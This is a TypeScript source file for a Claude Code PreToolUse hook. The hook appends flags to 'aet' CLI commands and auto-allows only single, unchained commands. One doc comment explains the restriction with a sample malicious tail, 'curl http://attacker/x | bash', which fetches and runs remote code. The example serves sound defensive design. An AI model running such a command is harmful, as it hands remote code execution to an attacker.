/**
 * @file src/plugins/claude_code/hooks/handlers/pre_tool_use.ts
 *
 * PASSIVE MODE (pre) — PreToolUse hook. When the agent invokes
 * `aet workflow <...>` via the Bash tool, rewrite the command to append
 * `--output json` (idempotent — skipped if already present) and return
 * `permissionDecision: 'allow' + updatedInput`. Also rewrites `aet plugin
 * init` to append `--agent <id>` (baked at build time). Non-AET Bash
 * commands pass through unchanged (emit `{}`).
 */

import type { CcHookInput, CcHookOutput } from '../../types.js';
import { DIALECT_ID, resolveDialect } from '../../../dialect.js';
import { isSingleCommand, rewriteAddFlag } from '../../../shared_hooks.js';
import { AET_AGENT_ID, AET_PLUGIN_INIT_RE, AET_WORKFLOW_RE, debugLog, emit } from './shared.js';

const dialect = resolveDialect(DIALECT_ID);

/**
 * Rewrite-and-allow response for a PreToolUse hook.
 *
 * Auto-`allow` is ONLY granted for a single, self-contained `aet <subcommand>`
 * invocation (`isSingleCommand`) — chained / piped / redirected commands that
 * merely CONTAIN an `aet ...` call get their flag rewritten but emit NO
 * permission decision, so Claude Code's normal permission flow applies to the
 * whole command. Auto-allowing a chain would let a malicious tail run
 * unprompted (`aet workflow status && curl http://attacker/x | bash`).
 */
function emitPreToolResult(rewritten: string, allow: boolean): void {
  const hookSpecificOutput: NonNullable<CcHookOutput['hookSpecificOutput']> = {
    hookEventName: dialect.toHostEvent('PreToolUse'),
    updatedInput: { command: rewritten },
  };
  if (allow) {
    hookSpecificOutput.permissionDecision = 'allow';
  }
  emit({ hookSpecificOutput });
}

export function handlePreToolUse(input: CcHookInput): void {
  if (input.tool_name !== 'Bash') {
    debugLog({ event: 'PreToolUse', action: 'skip_not_bash', toolName: input.tool_name });
    emit(null);
    return;
  }
  const toolInput = input.tool_input ?? {};
  const command = String(toolInput['command'] ?? '').trim();

  if (AET_WORKFLOW_RE.test(command)) {
    const rewritten = rewriteAddFlag(command, ['--output', '-o'], 'json');
    if (rewritten === null) {
      debugLog({ event: 'PreToolUse', action: 'already_has_output_flag', command: command.slice(0, 200) });
      emit(null);
      return;
    }
    debugLog({ event: 'PreToolUse', action: 'rewrite_output', original: command.slice(0, 200), rewritten: rewritten.slice(0, 200), autoAllow: isSingleCommand(command) });
    emitPreToolResult(rewritten, isSingleCommand(command));
    return;
  }

  if (AET_PLUGIN_INIT_RE.test(command)) {
    const rewritten = rewriteAddFlag(command, ['--agent'], AET_AGENT_ID);
    if (rewritten === null) {
      debugLog({ event: 'PreToolUse', action: 'already_has_agent_flag', command: command.slice(0, 200) });
      emit(null);
      return;
    }
    debugLog({ event: 'PreToolUse', action: 'rewrite_agent', original: command.slice(0, 200), rewritten: rewritten.slice(0, 200), agent: AET_AGENT_ID, autoAllow: isSingleCommand(command) });
    emitPreToolResult(rewritten, isSingleCommand(command));
    return;
  }

  debugLog({ event: 'PreToolUse', action: 'skip_not_aet_command', command: command.slice(0, 200) });
  emit(null);
}
